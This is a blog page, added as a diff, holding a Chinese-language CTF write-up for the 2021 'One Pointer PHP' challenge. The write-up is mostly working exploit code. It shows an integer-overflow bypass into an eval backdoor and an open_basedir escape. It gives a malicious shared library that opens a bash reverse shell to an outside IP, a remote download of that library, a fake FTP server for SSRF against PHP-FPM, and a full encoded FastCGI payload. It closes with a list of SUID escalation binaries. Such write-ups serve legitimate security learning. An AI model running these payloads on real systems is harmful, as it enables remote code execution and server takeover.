@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title itemprop="name">[蓝帽杯 2021]One Pointer PHP | Troy3e</title>
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="/css/font.css" media="all">
+  <link rel="stylesheet" href="/css/insight.css" media="all">
+  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "YukinoTroy3e";
+  mashiro_option.author_name = "Troy3e";
+  mashiro_option.site_url = "https://sakura.hojun.cn";
+  mashiro_option.v_appId = "kEnVX5WKqd0JPt4srHAJkgsC-gzGzoHsz";
+  mashiro_option.v_appKey = "h05kFRgBHS516pQ6vIsYtG1B";
+  mashiro_option.mathjax = "0";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+  <script type="text/javascript">
+  var bg = "https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-972788.jpg,https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/nfsgnftn.jpg,https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-994295.png".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+  </style>
+</head>
+</html>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop ">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="https://sakura.hojun.cn">
+          <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>人活着就是为了樱岛麻衣</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="https://space.bilibili.com/129300391" target="_blank" class="social-github" title="bilibili">
+                    <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/1188649.jpg">
+                  </a>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  <div id="video-container" style="">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu">
+    </div>
+  </div>
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">Yukino</span>
+            <span class="shironeko">Troy3e</span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+                    归档
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                  </ul>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1143425.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1143425.jpg">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      [蓝帽杯 2021]One Pointer PHP</h1>
+      <p class="entry-census">
+        <span>
+          <a href="">
+            <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="">Troy3e</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2021-5-6<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <p>这题没做出来需要反思<br>给了源码</p>
+<h2 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h2><p>user.php</p>
+<pre><code>&lt;?php
+class User{
+    public $count;
+}
+?&gt;
+</code></pre><p>add_api.php</p>
+<pre><code>&lt;?php
+include &quot;user.php&quot;;
+if($user=unserialize($_COOKIE[&quot;data&quot;])){
+    $count[++$user-&gt;count]=1;
+    if($count[]=1){
+        $user-&gt;count+=1;
+        setcookie(&quot;data&quot;,serialize($user));
+    }else{
+        eval($_GET[&quot;backdoor&quot;]);
+    }
+}else{
+    $user=new User;
+    $user-&gt;count=1;
+    setcookie(&quot;data&quot;,serialize($user));
+}
+?&gt;
+</code></pre><p>另$a-&gt;count等于php long long类型最大值-1即可绕过<br>本地测试如下：</p>
+<p>没过：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210430204027.png" alt></p>
+<p>过了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210430204051.png" alt></p>
+<p>过了之后就可以执行命令，查看phpinfo：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210430204141.png" alt></p>
+<p>ban了一大堆函数，print_r(scandir(./))看下目录：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210430204226.png" alt></p>
+<p>查看根目录失败，看到openbase_dir有限制，想起来[NCTF2019]phar matches everything里中bypass open_basedir的姿势：<a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720</a></p>
+<pre><code>&lt;?php 
+mkdir(&#39;troy3e&#39;);
+chdir(&#39;troy3e&#39;);
+ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
+chdir(&#39;..&#39;);chdir(&#39;..&#39;);
+chdir(&#39;..&#39;);chdir(&#39;..&#39;);
+chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);
+ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
+var_dump(file_get_contents(&quot;/usr/local/etc/php/php.ini&quot;));
+?&gt;
+</code></pre><p>没法读flag，估计是权限不够，但是可以读php.ini。<br>预期解是pwn这个：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210430210255.png" alt></p>
+<p>然后就不会了。。。<br>不过现在想想还是大意了，因为这非预期前阵子刚学习过，还就是上面NCTF那道题里面的。。。此处不得不佩服ha1师傅：<a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/" target="_blank" rel="noopener">https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/</a></p>
+<p>回到phpinfo</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210430210613.png" alt></p>
+<p>查看nginx配置文件：readfile(‘/etc/nginx/sites-enabled/default’);</p>
+<p>发现fpm开在9001端口。</p>
+<h2 id="FTP-SSRF-攻击-FPM-FastCGI"><a href="#FTP-SSRF-攻击-FPM-FastCGI" class="headerlink" title="FTP - SSRF 攻击 FPM/FastCGI"></a>FTP - SSRF 攻击 FPM/FastCGI</h2><p>如果一个客户端试图从FTP服务器上读取文件，服务器会通知客户端将文件的内容读取（或写）到一个特定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口。<br>如果我们传入<br>?file=<a href="ftp://evil-server/file.txt&amp;data=payload" target="_blank" rel="noopener">ftp://evil-server/file.txt&amp;data=payload</a><br>，会发生以下情况：</p>
+<p>首先通过 file_put_contents() 函数连接到我们的FTP服务器，并试图使用 file_put_contents() 把文件上传上去。但是我们搭建的恶意的ftp服务器将告诉它把文件发送到 127.0.0.1:9000。这样，我们就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF了。</p>
+<p>这里通过加载恶意so的方式来RCE。</p>
+<p>写一个扩展：</p>
+<pre><code>#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+__attribute__ ((__constructor__)) void preload (void){
+    system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/121.x.x.x/3333 0&gt;&amp;1&#39;&quot;);
+}
+</code></pre><p>编译：</p>
+<pre><code>gcc hpdoger.c -fPIC -shared -o hpdoger.so
+</code></pre><p>将生成的 hpdoger.so 上传到目标主机的 /tmp 目录中，之前复现就卡在这一步，直接用的copy属实是hanpi了(参考<a href="http://www.hackdig.com/05/hack-342091.htm)：" target="_blank" rel="noopener">http://www.hackdig.com/05/hack-342091.htm)：</a></p>
+<pre><code>/add_api.php?backdoor=mkdir(&#39;troy3e&#39;);chdir(&#39;troy3e&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);copy(&#39;http://121.196.169.53:5554/hpdoger.so)
+</code></pre><p>然后再自己vps上使用以下脚本搭建一个恶意的ftp服务器：</p>
+<pre><code>import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+s.bind((&#39;0.0.0.0&#39;, 2000))
+s.listen(1)
+conn, addr = s.accept()
+conn.send(b&#39;220 welcome\n&#39;)
+#Service ready for new user.
+#Client send anonymous username
+#USER anonymous
+conn.send(b&#39;331 Please specify the password.\n&#39;)
+#User name okay, need password.
+#Client send anonymous password.
+#PASS anonymous
+conn.send(b&#39;230 Login successful.\n&#39;)
+#User logged in, proceed. Logged out if appropriate.
+#TYPE I
+conn.send(b&#39;200 Switching to Binary mode.\n&#39;)
+#Size /
+conn.send(b&#39;550 Could not get the file size.\n&#39;)
+#EPSV (1)
+conn.send(b&#39;150 ok\n&#39;)
+#PASV
+conn.send(b&#39;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#39;) #STOR / (2)
+conn.send(b&#39;150 Permission denied.\n&#39;)
+#QUIT
+conn.send(b&#39;221 Goodbye.\n&#39;)
+conn.close()
+</code></pre><p>同时监听3333端口。<br>生成攻击 php-fpm 所需要的payload：</p>
+<pre><code>&lt;?php
+/**
+ * Note : Code is released under the GNU LGPL
+ *
+ * Please do not change the header of this file
+ *
+ * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
+ * Lesser General Public License as published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
+ * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ *
+ * See the GNU Lesser General Public License for more details.
+ */
+/**
+ * Handles communication with a FastCGI application
+ *
+ * @author      Pierrick Charron &lt;pierrick@webstart.fr&gt;
+ * @version     1.0
+ */
+class FCGIClient
+{
+    const VERSION_1            = 1;
+    const BEGIN_REQUEST        = 1;
+    const ABORT_REQUEST        = 2;
+    const END_REQUEST          = 3;
+    const PARAMS               = 4;
+    const STDIN                = 5;
+    const STDOUT               = 6;
+    const STDERR               = 7;
+    const DATA                 = 8;
+    const GET_VALUES           = 9;
+    const GET_VALUES_RESULT    = 10;
+    const UNKNOWN_TYPE         = 11;
+    const MAXTYPE              = self::UNKNOWN_TYPE;
+    const RESPONDER            = 1;
+    const AUTHORIZER           = 2;
+    const FILTER               = 3;
+    const REQUEST_COMPLETE     = 0;
+    const CANT_MPX_CONN        = 1;
+    const OVERLOADED           = 2;
+    const UNKNOWN_ROLE         = 3;
+    const MAX_CONNS            = &#39;MAX_CONNS&#39;;
+    const MAX_REQS             = &#39;MAX_REQS&#39;;
+    const MPXS_CONNS           = &#39;MPXS_CONNS&#39;;
+    const HEADER_LEN           = 8;
+    /**
+     * Socket
+     * @var Resource
+     */
+    private $_sock = null;
+    /**
+     * Host
+     * @var String
+     */
+    private $_host = null;
+    /**
+     * Port
+     * @var Integer
+     */
+    private $_port = null;
+    /**
+     * Keep Alive
+    * @var Boolean
+     */
+    private $_keepAlive = false;
+    /**
+     * Constructor
+     *
+     * @param String $host Host of the FastCGI application
+     * @param Integer $port Port of the FastCGI application
+    */
+    public function __construct($host, $port = 9001) // and     default value for port, just for unixdomain socket
+    {
+        $this-&gt;_host = $host;
+        $this-&gt;_port = $port;
+    }
+    /**
+     * Define whether or not the FastCGI application should     keep the connection
+     * alive at the end of a request
+     *
+     * @param Boolean $b true if the connection should stay     alive, false otherwise
+     */
+    public function setKeepAlive($b)
+    {
+    $this-&gt;_keepAlive = (boolean)$b;
+        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) {
+            fclose($this-&gt;_sock);
+        }
+    }
+    /**
+     * Get the keep alive status
+     *
+     * @return Boolean true if the connection should stay     alive, false otherwise
+     */
+    public function getKeepAlive()
+    {
+        return $this-&gt;_keepAlive;
+    }
+    /**
+     * Create a connection to the FastCGI application
+     */
+    private function connect()
+    {
+        if (!$this-&gt;_sock) {
+            //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-    &gt;_port, $errno, $errstr, 5);
+            $this-&gt;_sock = stream_socket_client($this-&gt;_host,     $errno, $errstr, 5);
+            if (!$this-&gt;_sock) {
+                throw new Exception(&#39;Unable to connect to     FastCGI application&#39;);
+            }
+        }
+    }
+    /**
+     * Build a FastCGI packet
+     *
+     * @param Integer $type Type of the packet
+     * @param String $content Content of the packet
+     * @param Integer $requestId RequestId
+     */
+    private function buildPacket($type, $content, $requestId =     1)
+    {
+        $clen = strlen($content);
+        return chr(self::VERSION_1)         /* version */
+            . chr($type)                    /* type */
+            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */
+            . chr($requestId &amp; 0xFF)        /* requestIdB0 */
+            . chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1     */
+            . chr($clen &amp; 0xFF)             /* contentLengthB0 */
+            . chr(0)                        /* paddingLength */
+            . chr(0)                        /* reserved */
+            . $content;                     /* content */
+    }
+    /**
+     * Build an FastCGI Name value pair
+     *
+     * @param String $name Name
+     * @param String $value Value
+     * @return String FastCGI Name value pair
+     */
+    private function buildNvpair($name, $value)
+    {
+        $nlen = strlen($name);
+        $vlen = strlen($value);
+        if ($nlen &lt; 128) {
+            /* nameLengthB0 */
+            $nvpair = chr($nlen);
+        } else {
+            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp;     nameLengthB0 */
+            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
+        }
+        if ($vlen &lt; 128) {
+            /* valueLengthB0 */
+            $nvpair .= chr($vlen);
+        } else {
+            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
+            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
+        }
+        /* nameData &amp; valueData */
+        return $nvpair . $name . $value;
+    }
+    /**
+     * Read a set of FastCGI Name value pairs
+     *
+     * @param String $data Data containing the set of FastCGI NVPair
+     * @return array of NVPair
+     */
+    private function readNvpair($data, $length = null)
+    {
+        $array = array();
+        if ($length === null) {
+            $length = strlen($data);
+        }
+        $p = 0;
+        while ($p != $length) {
+            $nlen = ord($data{$p++});
+            if ($nlen &gt;= 128) {
+                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);
+                $nlen |= (ord($data{$p++}) &lt;&lt; 16);
+                $nlen |= (ord($data{$p++}) &lt;&lt; 8);
+                $nlen |= (ord($data{$p++}));
+            }
+            $vlen = ord($data{$p++});
+            if ($vlen &gt;= 128) {
+                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);
+                $vlen |= (ord($data{$p++}) &lt;&lt; 16);
+                $vlen |= (ord($data{$p++}) &lt;&lt; 8);
+                $vlen |= (ord($data{$p++}));
+            }
+            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
+            $p += ($nlen + $vlen);
+        }
+        return $array;
+    }
+    /**
+     * Decode a FastCGI Packet
+     *
+     * @param String $data String containing all the packet
+     * @return array
+     */
+    private function decodePacketHeader($data)
+    {
+        $ret = array();
+        $ret[&#39;version&#39;]       = ord($data{0});
+        $ret[&#39;type&#39;]          = ord($data{1});
+        $ret[&#39;requestId&#39;]     = (ord($data{2}) &lt;&lt; 8) + ord($data{3});
+        $ret[&#39;contentLength&#39;] = (ord($data{4}) &lt;&lt; 8) + ord($data{5});
+        $ret[&#39;paddingLength&#39;] = ord($data{6});
+        $ret[&#39;reserved&#39;]      = ord($data{7});
+        return $ret;
+    }
+    /**
+     * Read a FastCGI Packet
+     *
+     * @return array
+     */
+        private function readPacket()
+    {
+        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) {
+            $resp = $this-&gt;decodePacketHeader($packet);
+            $resp[&#39;content&#39;] = &#39;&#39;;
+        if ($resp[&#39;contentLength&#39;]) {
+                $len  = $resp[&#39;contentLength&#39;];
+                while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len))     {
+                    $len -= strlen($buf);
+                    $resp[&#39;content&#39;] .= $buf;
+                }
+            }
+            if ($resp[&#39;paddingLength&#39;]) {
+                $buf=fread($this-&gt;_sock, $resp[&#39;paddingLength&#39;]);
+            }
+            return $resp;
+        } else {
+            return false;
+        }
+    }
+    /**
+     * Get Informations on the FastCGI application
+     *
+     * @param array $requestedInfo information to retrieve
+     * @return array
+     */
+    public function getValues(array $requestedInfo)
+    {
+        $this-&gt;connect();
+        $request = &#39;&#39;;
+        foreach ($requestedInfo as $info) {
+        $request .= $this-&gt;buildNvpair($info, &#39;&#39;);
+        }
+        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));
+        $resp = $this-&gt;readPacket();
+        if ($resp[&#39;type&#39;] == self::GET_VALUES_RESULT) {
+            return $this-&gt;readNvpair($resp[&#39;content&#39;], $resp[&#39;length&#39;]);
+        } else {
+            throw new Exception(&#39;Unexpected response type, expecting GET_VALUES_RESULT&#39;);
+        }
+    }
+    /**
+     * Execute a request to the FastCGI application
+     *
+     * @param array $params Array of parameters
+     * @param String $stdin Content
+     * @return String
+     */
+    public function request(array $params, $stdin)
+    {
+        $response = &#39;&#39;;
+//        $this-&gt;connect();
+        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5));
+        $paramsRequest = &#39;&#39;;
+        foreach ($params as $key =&gt; $value) {
+            $paramsRequest .= $this-&gt;buildNvpair($key,     $value);
+        }
+        if ($paramsRequest) {
+            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);
+        }
+        $request .= $this-&gt;buildPacket(self::PARAMS, &#39;&#39;);
+        if ($stdin) {
+            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);
+        }
+        $request .= $this-&gt;buildPacket(self::STDIN, &#39;&#39;);
+        echo(&#39;data=&#39;.urlencode($request));
+//        fwrite($this-&gt;_sock, $request);
+//        do {
+//            $resp = $this-&gt;readPacket();
+//            if ($resp[&#39;type&#39;] == self::STDOUT || $resp[&#39;type&#39;] == self::STDERR) {
+//                $response .= $resp[&#39;content&#39;];
+//            }
+//        } while ($resp &amp;&amp; $resp[&#39;type&#39;] != self::END_REQUEST);
+//        var_dump($resp);
+//        if (!is_array($resp)) {
+//            throw new Exception(&#39;Bad request&#39;);
+//        }
+//        switch (ord($resp[&#39;content&#39;]{4})) {
+//            case self::CANT_MPX_CONN:
+//                throw new Exception(&#39;This app can\&#39;t multiplex [CANT_MPX_CONN]&#39;);
+//                break;
+//            case self::OVERLOADED:
+//                throw new Exception(&#39;New request rejected; too busy [OVERLOADED]&#39;);
+//                break;
+//            case self::UNKNOWN_ROLE:
+//                throw new Exception(&#39;Role value not known [UNKNOWN_ROLE]&#39;);
+//                break;
+//            case self::REQUEST_COMPLETE:
+//                return $response;
+//        }
+    }
+}
+?&gt;
+&lt;?php
+// real exploit start here
+//if (!isset($_REQUEST[&#39;cmd&#39;])) {
+//    die(&quot;Check your input\n&quot;);
+//}
+//if (!isset($_REQUEST[&#39;filepath&#39;])) {
+//    $filepath = __FILE__;
+//}else{
+//    $filepath = $_REQUEST[&#39;filepath&#39;];
+//}
+
+$filepath = &quot;/var/www/html/add_api.php&quot;;
+$req = &#39;/&#39;.basename($filepath);
+$uri = $req .&#39;?&#39;.&#39;command=whoami&#39;;
+$client = new FCGIClient(&quot;unix:///var/run/php-fpm.sock&quot;, -1);
+$code = &quot;&lt;?php system(\$_REQUEST[&#39;command&#39;]); phpinfo(); ?&gt;&quot;; // php payload -- Doesnt do anything
+$php_value = &quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;;
+$params = array(
+    &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,
+    &#39;REQUEST_METHOD&#39;    =&gt; &#39;POST&#39;,
+    &#39;SCRIPT_FILENAME&#39;   =&gt; $filepath,
+    &#39;SCRIPT_NAME&#39;       =&gt; $req,
+    &#39;QUERY_STRING&#39;      =&gt; &#39;command=whoami&#39;,
+    &#39;REQUEST_URI&#39;       =&gt; $uri,
+    &#39;DOCUMENT_URI&#39;      =&gt; $req,
+#&#39;DOCUMENT_ROOT&#39;     =&gt; &#39;/&#39;,
+    &#39;PHP_VALUE&#39;         =&gt; $php_value,
+    &#39;SERVER_SOFTWARE&#39;   =&gt; &#39;80sec/wofeiwo&#39;,
+    &#39;REMOTE_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
+    &#39;REMOTE_PORT&#39;       =&gt; &#39;9001&#39;,
+    &#39;SERVER_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
+    &#39;SERVER_PORT&#39;       =&gt; &#39;80&#39;,
+    &#39;SERVER_NAME&#39;       =&gt; &#39;localhost&#39;,
+    &#39;SERVER_PROTOCOL&#39;   =&gt; &#39;HTTP/1.1&#39;,
+    &#39;CONTENT_LENGTH&#39;    =&gt; strlen($code)
+);
+// print_r($_REQUEST);
+// print_r($params);
+//echo &quot;Call: $uri\n\n&quot;;
+echo $client-&gt;request($params, $code).&quot;\n&quot;;
+?&gt;
+</code></pre><p>payload：</p>
+<pre><code>567bb380-8360-4aeb-b93c-cddea7970584.node3.buuoj.cn/add_api.php?backdoor=$file = $_GET[&#39;file&#39;];$data = $_GET[&#39;data&#39;];file_put_contents($file,$data);&amp;file=ftp://121.x.x.x:2000&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9000%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
+</code></pre><p>但此时权限还是不够，无法读取flag：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210506143236.png" alt></p>
+<h2 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h2><p>UID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。</p>
+<p>已知的可用来提权的linux可行性的文件列表如下：</p>
+<pre><code>nmap
+vim
+find
+bash
+more
+less
+nano
+cp
